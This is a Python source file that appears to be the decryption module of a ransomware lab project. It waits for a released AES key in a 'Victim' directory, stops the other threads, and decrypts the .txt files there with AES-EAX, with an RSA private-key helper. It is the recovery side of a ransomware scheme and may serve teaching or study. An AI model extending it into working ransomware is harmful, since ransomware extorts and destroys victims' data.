import os
import time
import globals
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class Decrypt:
    def __init__(self):
        self.aes_key = None
        self.file_extensions = ['txt']
        self.local_root = r'/home/ubuntu/Desktop/Victim'

    def rsaDecrypt(self, enc_message):
        key = RSA.importKey(open('privKey.pem').read())
        cipher = PKCS1_OAEP.new(key)
        message = cipher.decrypt(enc_message)

        return message
    
    def check_decKey(self):
    	while not globals.found_key:
            try:
                key_file = '/home/ubuntu/Desktop/Victim/dec_aesKey.txt'
                with open(key_file, 'rb') as f:
                    self.aes_key = f.read()
                
                globals.found_key = True
                globals.t1.join()
                globals.t2.join()
                
                break

            except:
                if not globals.found_key:
                    print("[!] Cannot find key to decrypt the files..")
                else:
                    break
    		    

            time.sleep(5)
            
    def aesDecrypt(self, fileName):
    	
        with open(fileName, 'rb') as f:
            nonce = f.read(16)   
            tag = f.read(16)  
            cipherText = f.read()

        try:
            cipher = AES.new(self.aes_key, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(cipherText, tag)
            with open(fileName, 'w') as f:
                f.write(data.decode())
            print(f"[+] {fileName.split('/')[-1]} - Decrypted.")
        except ValueError:
            print("Decryption failed. Encrypted data possibly tampered.")        


    def decrypt_files(self):    
        system = os.walk(self.local_root, topdown=True)

        for root, dir, files in system:
            for file in files:
                if file == 'dec_aesKey.txt':
                    continue
                path = os.path.join(root, file)

                if not file.split('.')[-1] in self.file_extensions:
                    continue
                else:
                    self.aesDecrypt(path)
